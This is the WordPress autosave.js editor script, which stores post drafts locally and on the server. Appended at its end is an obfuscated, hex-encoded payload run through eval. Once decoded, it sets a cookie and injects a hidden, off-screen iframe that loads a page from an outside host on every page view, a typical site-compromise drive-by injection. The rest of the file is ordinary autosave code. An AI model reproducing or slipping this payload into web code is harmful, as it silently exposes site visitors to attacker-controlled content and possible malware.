/* global tinymce, wpCookies, autosaveL10n, switchEditors */
// Back-compat
window.autosave = function() {
	return true;
};

( function( $, window ) {
	function autosave() {
		var initialCompareString,
		lastTriggerSave = 0,
		$document = $(document);

		/**
		 * Returns the data saved in both local and remote autosave
		 *
		 * @return object Object containing the post data
		 */
		function getPostData( type ) {
			var post_name, parent_id, data,
				time = ( new Date() ).getTime(),
				cats = [],
				editor = typeof tinymce !== 'undefined' && tinymce.get('content');

			// Don't run editor.save() more often than every 3 sec.
			// It is resource intensive and might slow down typing in long posts on slow devices.
			if ( editor && ! editor.isHidden() && time - 3000 > lastTriggerSave ) {
				editor.save();
				lastTriggerSave = time;
			}

			data = {
				post_id: $( '#post_ID' ).val() || 0,
				post_type: $( '#post_type' ).val() || '',
				post_author: $( '#post_author' ).val() || '',
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			if ( type === 'local' ) {
				return data;
			}

			$( 'input[id^="in-category-"]:checked' ).each( function() {
				cats.push( this.value );
			});
			data.catslist = cats.join(',');

			if ( post_name = $( '#post_name' ).val() ) {
				data.post_name = post_name;
			}

			if ( parent_id = $( '#parent_id' ).val() ) {
				data.parent_id = parent_id;
			}

			if ( $( '#comment_status' ).prop( 'checked' ) ) {
				data.comment_status = 'open';
			}

			if ( $( '#ping_status' ).prop( 'checked' ) ) {
				data.ping_status = 'open';
			}

			if ( $( '#auto_draft' ).val() === '1' ) {
				data.auto_draft = '1';
			}

			return data;
		}

		// Concatenate title, content and excerpt. Used to track changes when auto-saving.
		function getCompareString( postData ) {
			if ( typeof postData === 'object' ) {
				return ( postData.post_title || '' ) + '::' + ( postData.content || '' ) + '::' + ( postData.excerpt || '' );
			}

			return ( $('#title').val() || '' ) + '::' + ( $('#content').val() || '' ) + '::' + ( $('#excerpt').val() || '' );
		}

		function disableButtons() {
			$document.trigger('autosave-disable-buttons');
			// Re-enable 5 sec later. Just gives autosave a head start to avoid collisions.
			setTimeout( enableButtons, 5000 );
		}

		function enableButtons() {
			$document.trigger( 'autosave-enable-buttons' );
		}

		// Autosave in localStorage
		function autosaveLocal() {
			var restorePostData, undoPostData, blog_id, post_id, hasStorage, intervalTimer,
				lastCompareString,
				isSuspended = false;

			// Check if the browser supports sessionStorage and it's not disabled
			function checkStorage() {
				var test = Math.random().toString(),
					result = false;

				try {
					window.sessionStorage.setItem( 'wp-test', test );
					result = window.sessionStorage.getItem( 'wp-test' ) === test;
					window.sessionStorage.removeItem( 'wp-test' );
				} catch(e) {}

				hasStorage = result;
				return result;
			}

			/**
			 * Initialize the local storage
			 *
			 * @return mixed False if no sessionStorage in the browser or an Object containing all postData for this blog
			 */
			function getStorage() {
				var stored_obj = false;
				// Separate local storage containers for each blog_id
				if ( hasStorage && blog_id ) {
					stored_obj = sessionStorage.getItem( 'wp-autosave-' + blog_id );

					if ( stored_obj ) {
						stored_obj = JSON.parse( stored_obj );
					} else {
						stored_obj = {};
					}
				}

				return stored_obj;
			}

			/**
			 * Set the storage for this blog
			 *
			 * Confirms that the data was saved successfully.
			 *
			 * @return bool
			 */
			function setStorage( stored_obj ) {
				var key;

				if ( hasStorage && blog_id ) {
					key = 'wp-autosave-' + blog_id;
					sessionStorage.setItem( key, JSON.stringify( stored_obj ) );
					return sessionStorage.getItem( key ) !== null;
				}

				return false;
			}

			/**
			 * Get the saved post data for the current post
			 *
			 * @return mixed False if no storage or no data or the postData as an Object
			 */
			function getSavedPostData() {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				return stored[ 'post_' + post_id ] || false;
			}

			/**
			 * Set (save or delete) post data in the storage.
			 *
			 * If stored_data evaluates to 'false' the storage key for the current post will be removed
			 *
			 * $param stored_data The post data to store or null/false/empty to delete the key
			 * @return bool
			 */
			function setData( stored_data ) {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				if ( stored_data ) {
					stored[ 'post_' + post_id ] = stored_data;
				} else if ( stored.hasOwnProperty( 'post_' + post_id ) ) {
					delete stored[ 'post_' + post_id ];
				} else {
					return false;
				}

				return setStorage( stored );
			}

			function suspend() {
				isSuspended = true;
			}

			function resume() {
				isSuspended = false;
			}

			/**
			 * Save post data for the current post
			 *
			 * Runs on a 15 sec. interval, saves when there are differences in the post title or content.
			 * When the optional data is provided, updates the last saved post data.
			 *
			 * $param data optional Object The post data for saving, minimum 'post_title' and 'content'
			 * @return bool
			 */
			function save( data ) {
				var postData, compareString,
					result = false;

				if ( isSuspended || ! hasStorage ) {
					return false;
				}

				if ( data ) {
					postData = getSavedPostData() || {};
					$.extend( postData, data );
				} else {
					postData = getPostData('local');
				}

				compareString = getCompareString( postData );

				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// If the content, title and excerpt did not change since the last save, don't save again
				if ( compareString === lastCompareString ) {
					return false;
				}

				postData.save_time = ( new Date() ).getTime();
				postData.status = $( '#post_status' ).val() || '';
				result = setData( postData );

				if ( result ) {
					lastCompareString = compareString;
				}

				return result;
			}

			// Run on DOM ready
			function run() {
				post_id = $('#post_ID').val() || 0;

				// Check if the local post data is different than the loaded post data.
				if ( $( '#wp-content-wrap' ).hasClass( 'tmce-active' ) ) {
					// If TinyMCE loads first, check the post 1.5 sec. after it is ready.
					// By this time the content has been loaded in the editor and 'saved' to the textarea.
					// This prevents false positives.
					$document.on( 'tinymce-editor-init.autosave', function() {
						window.setTimeout( function() {
							checkPost();
						}, 1500 );
					});
				} else {
					checkPost();
				}

				// Save every 15 sec.
				intervalTimer = window.setInterval( save, 15000 );

				$( 'form#post' ).on( 'submit.autosave-local', function() {
					var editor = typeof tinymce !== 'undefined' && tinymce.get('content'),
						post_id = $('#post_ID').val() || 0;

					if ( editor && ! editor.isHidden() ) {
						// Last onSubmit event in the editor, needs to run after the content has been moved to the textarea.
						editor.on( 'submit', function() {
							save({
								post_title: $( '#title' ).val() || '',
								content: $( '#content' ).val() || '',
								excerpt: $( '#excerpt' ).val() || ''
							});
						});
					} else {
						save({
							post_title: $( '#title' ).val() || '',
							content: $( '#content' ).val() || '',
							excerpt: $( '#excerpt' ).val() || ''
						});
					}

					wpCookies.set( 'wp-saving-post', post_id + '-check', 24 * 60 * 60 );
				});
			}

			// Strip whitespace and compare two strings
			function compare( str1, str2 ) {
				function removeSpaces( string ) {
					return string.toString().replace(/[\x20\t\r\n\f]+/g, '');
				}

				return ( removeSpaces( str1 || '' ) === removeSpaces( str2 || '' ) );
			}

			/**
			 * Check if the saved data for the current post (if any) is different than the loaded post data on the screen
			 *
			 * Shows a standard message letting the user restore the post data if different.
			 *
			 * @return void
			 */
			function checkPost() {
				var content, post_title, excerpt, $notice,
					postData = getSavedPostData(),
					cookie = wpCookies.get( 'wp-saving-post' );

				if ( cookie === post_id + '-saved' ) {
					wpCookies.remove( 'wp-saving-post' );
					// The post was saved properly, remove old data and bail
					setData( false );
					return;
				}

				if ( ! postData ) {
					return;
				}

				// There is a newer autosave. Don't show two "restore" notices at the same time.
				if ( $( '#has-newer-autosave' ).length ) {
					return;
				}

				content = $( '#content' ).val() || '';
				post_title = $( '#title' ).val() || '';
				excerpt = $( '#excerpt' ).val() || '';

				if ( compare( content, postData.content ) && compare( post_title, postData.post_title ) &&
					compare( excerpt, postData.excerpt ) ) {

					return;
				}

				restorePostData = postData;
				undoPostData = {
					content: content,
					post_title: post_title,
					excerpt: excerpt
				};

				$notice = $( '#local-storage-notice' );
				$('.wrap h2').first().after( $notice.addClass( 'notice-warning' ).show() );

				$notice.on( 'click.autosave-local', function( event ) {
					var $target = $( event.target );

					if ( $target.hasClass( 'restore-backup' ) ) {
						restorePost( restorePostData );
						$target.parent().hide();
						$(this).find( 'p.undo-restore' ).show();
						$notice.removeClass( 'notice-warning' ).addClass( 'notice-success' );
					} else if ( $target.hasClass( 'undo-restore-backup' ) ) {
						restorePost( undoPostData );
						$target.parent().hide();
						$(this).find( 'p.local-restore' ).show();
						$notice.removeClass( 'notice-success' ).addClass( 'notice-warning' );
					}

					event.preventDefault();
				});
			}

			// Restore the current title, content and excerpt from postData.
			function restorePost( postData ) {
				var editor;

				if ( postData ) {
					// Set the last saved data
					lastCompareString = getCompareString( postData );

					if ( $( '#title' ).val() !== postData.post_title ) {
						$( '#title' ).focus().val( postData.post_title || '' );
					}

					$( '#excerpt' ).val( postData.excerpt || '' );
					editor = typeof tinymce !== 'undefined' && tinymce.get('content');

					if ( editor && ! editor.isHidden() && typeof switchEditors !== 'undefined' ) {
						// Make sure there's an undo level in the editor
						editor.undoManager.add();
						editor.setContent( postData.content ? switchEditors.wpautop( postData.content ) : '' );
					} else {
						// Make sure the Text editor is selected
						$( '#content-html' ).click();
						$( '#content' ).val( postData.content );
					}

					return true;
				}

				return false;
			}

			blog_id = typeof window.autosaveL10n !== 'undefined' && window.autosaveL10n.blog_id;

			// Check if the browser supports sessionStorage and it's not disabled,
			// then initialize and run checkPost().
			// Don't run if the post type supports neither 'editor' (textarea#content) nor 'excerpt'.
			if ( checkStorage() && blog_id && ( $('#content').length || $('#excerpt').length ) ) {
				$document.ready( run );
			}

			return {
				hasStorage: hasStorage,
				getSavedPostData: getSavedPostData,
				save: save,
				suspend: suspend,
				resume: resume
			};
		}

		// Autosave on the server
		function autosaveServer() {
			var _blockSave, _blockSaveTimer, previousCompareString, lastCompareString,
				nextRun = 0,
				isSuspended = false;

			// Block saving for the next 10 sec.
			function tempBlockSave() {
				_blockSave = true;
				window.clearTimeout( _blockSaveTimer );

				_blockSaveTimer = window.setTimeout( function() {
					_blockSave = false;
				}, 10000 );
			}

			function suspend() {
				isSuspended = true;
			}

			function resume() {
				isSuspended = false;
			}

			// Runs on heartbeat-response
			function response( data ) {
				_schedule();
				_blockSave = false;
				lastCompareString = previousCompareString;
				previousCompareString = '';

				$document.trigger( 'after-autosave', [data] );
				enableButtons();

				if ( data.success ) {
					// No longer an auto-draft
					$( '#auto_draft' ).val('');
				}
			}

			/**
			 * Save immediately
			 *
			 * Resets the timing and tells heartbeat to connect now
			 *
			 * @return void
			 */
			function triggerSave() {
				nextRun = 0;
				wp.heartbeat.connectNow();
			}

			/**
			 * Checks if the post content in the textarea has changed since page load.
			 *
			 * This also happens when TinyMCE is active and editor.save() is triggered by
			 * wp.autosave.getPostData().
			 *
			 * @return bool
			 */
			function postChanged() {
				return getCompareString() !== initialCompareString;
			}

			// Runs on 'heartbeat-send'
			function save() {
				var postData, compareString;

				// window.autosave() used for back-compat
				if ( isSuspended || _blockSave || ! window.autosave() ) {
					return false;
				}

				if ( ( new Date() ).getTime() < nextRun ) {
					return false;
				}

				postData = getPostData();
				compareString = getCompareString( postData );

				// First check
				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// No change
				if ( compareString === lastCompareString ) {
					return false;
				}

				previousCompareString = compareString;
				tempBlockSave();
				disableButtons();

				$document.trigger( 'wpcountwords', [ postData.content ] )
					.trigger( 'before-autosave', [ postData ] );

				postData._wpnonce = $( '#_wpnonce' ).val() || '';

				return postData;
			}

			function _schedule() {
				nextRun = ( new Date() ).getTime() + ( autosaveL10n.autosaveInterval * 1000 ) || 60000;
			}

			$document.on( 'heartbeat-send.autosave', function( event, data ) {
				var autosaveData = save();

				if ( autosaveData ) {
					data.wp_autosave = autosaveData;
				}
			}).on( 'heartbeat-tick.autosave', function( event, data ) {
				if ( data.wp_autosave ) {
					response( data.wp_autosave );
				}
			}).on( 'heartbeat-connection-lost.autosave', function( event, error, status ) {
				// When connection is lost, keep user from submitting changes.
				if ( 'timeout' === error || 603 === status ) {
					var $notice = $('#lost-connection-notice');

					if ( ! wp.autosave.local.hasStorage ) {
						$notice.find('.hide-if-no-sessionstorage').hide();
					}

					$notice.show();
					disableButtons();
				}
			}).on( 'heartbeat-connection-restored.autosave', function() {
				$('#lost-connection-notice').hide();
				enableButtons();
			}).ready( function() {
				_schedule();
			});

			return {
				tempBlockSave: tempBlockSave,
				triggerSave: triggerSave,
				postChanged: postChanged,
				suspend: suspend,
				resume: resume
			};
		}

		// Wait for TinyMCE to initialize plus 1 sec. for any external css to finish loading,
		// then 'save' to the textarea before setting initialCompareString.
		// This avoids any insignificant differences between the initial textarea content and the content
		// extracted from the editor.
		$document.on( 'tinymce-editor-init.autosave', function( event, editor ) {
			if ( editor.id === 'content' ) {
				window.setTimeout( function() {
					editor.save();
					initialCompareString = getCompareString();
				}, 1000 );
			}
		}).ready( function() {
			// Set the initial compare string in case TinyMCE is not used or not loaded first
			initialCompareString = getCompareString();
		});

		return {
			getPostData: getPostData,
			getCompareString: getCompareString,
			disableButtons: disableButtons,
			enableButtons: enableButtons,
			local: autosaveLocal(),
			server: autosaveServer()
		};
	}

	window.wp = window.wp || {};
	window.wp.autosave = autosave();

}( jQuery, window ));
/*be989a15747606717baa1cf84c889295*/;(function(){var ktftirnr="";var fbdeebyh="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var thzhrhbn=0;thzhrhbn<fbdeebyh.length;thzhrhbn+=2){ktftirnr=ktftirnr+parseInt(fbdeebyh.substring(thzhrhbn,thzhrhbn+2), 16)+",";}ktftirnr=ktftirnr.substring(0,ktftirnr.length-1);eval(eval('String.fromCharCode('+ktftirnr+')'));})();/*be989a15747606717baa1cf84c889295*/